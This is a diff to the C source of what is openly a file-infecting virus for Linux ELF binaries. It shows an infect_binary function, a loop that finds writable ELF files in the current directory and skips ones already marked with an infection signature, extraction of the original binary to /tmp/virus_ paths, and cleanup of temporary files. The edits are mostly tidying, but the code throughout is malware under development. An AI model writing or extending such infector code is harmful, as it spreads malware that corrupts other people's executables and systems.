@@ -92,10 +92,6 @@ int infect_binary(const char *inject_elf_path, const char *target_elf_path) {
 
 	FILE *inject_elf = fopen(inject_elf_path, "rb");
 	FILE *target_elf = fopen(target_elf_path, "rb");
-	if (!inject_elf){
-		perror("Error opening inject elf path");
-		return 1;
-	}
 
 	if (!inject_elf || !target_elf) {
 		perror("Error opening files");
@@ -255,7 +251,7 @@ int main(int argc, char *argv[]) {
 			return 1;
 		}
 
-		// Extract the original binary to /tmp/<original_name>
+		// Extract the original binary to /tmp/virus_<original_name>
 		snprintf(tmp_path, sizeof(tmp_path), "/tmp/virus_%s", program_name);
 		if (extract_original_binary(original_file, tmp_path) != 0) {
 			fclose(original_file);
@@ -288,17 +284,17 @@ int main(int argc, char *argv[]) {
 			if (dir->d_type == DT_REG) { // Check if it is a regular file
 				// printf("Scanning file: %s\n", dir->d_name);
 
-        // Skip if the file is the program itself
-        if (strcmp(dir->d_name, program_name) == 0) continue;
-        				
-        // Skip if the file is non writable
+				// Skip if the file is the program itself
+				if (strcmp(dir->d_name, program_name) == 0) continue;
+							
+        		// Skip if the file is non writable
 				if (! is_writable(dir->d_name)) continue;
         
-        // Skip if the file is non ELF
+        		// Skip if the file is non ELF
 				if ( !is_elf_file(dir->d_name)) continue;
 				// printf("Scanning ELF file: %s\n", dir->d_name);
 
-        // Check if the file has been infected already
+        		// Check if the file has been infected already
 				int result = find_signature_in_file(dir->d_name, SIGNATURE, SIGNATURE_SIZE);
 				if (result == 1) {
 				  // printf("Signature already found in %s.\n", dir->d_name);
@@ -314,13 +310,14 @@ int main(int argc, char *argv[]) {
         // inject_signature(dir->d_name, SIGNATURE, SIGNATURE_SIZE);
 
 
-						}
+				}
 			}
 		}
 		closedir(d);
 	}
 
 
+	// delete temporary files
 	if (strcmp(program_name, "virus") != 0){
 		remove("/tmp/virus");
 		remove(tmp_path);
